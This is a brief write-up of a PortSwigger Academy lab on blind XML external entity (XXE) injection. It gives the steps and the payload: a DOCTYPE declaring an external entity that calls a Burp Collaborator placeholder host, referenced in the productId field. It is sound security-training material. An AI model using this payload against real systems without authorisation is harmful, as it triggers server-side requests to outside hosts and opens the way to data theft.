# Lab: Blind XXE with out-of-band interaction

**Official lab:** [PortSwigger Web Security Academy](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)

**Lab idea:** The XML parser's results are not reflected in the response, so the challenge centers on detecting blind XXE through an external DNS or HTTP interaction. It practices using a controlled collaborator service to observe parser-initiated network activity.

## Vulnerability in brief
XML external entity (XXE) injection is a vulnerability in applications that process attacker-influenced XML. When an XML parser resolves externally defined entities, the application may be made to access local files or issue network requests using the server's own access and network position. Whether data is exposed directly depends on how the application handles parsed values and errors.

## Solution idea
1. Visit a product page, click "Check stock" and intercept the resulting POST request in Burp Suite Professional.
2. Insert the following external entity definition in between the XML declaration and the stockCheck element.
3. Replace the productId number with a reference to the external entity: &xxe;
4. Go to the Collaborator tab, and click "Poll now".

## Payloads / key values
- `stockCheck`
- `<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>`
- `productId`
- `&xxe;`

## Official source
- [PortSwigger Academy: Lab: Blind XXE with out-of-band interaction](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)
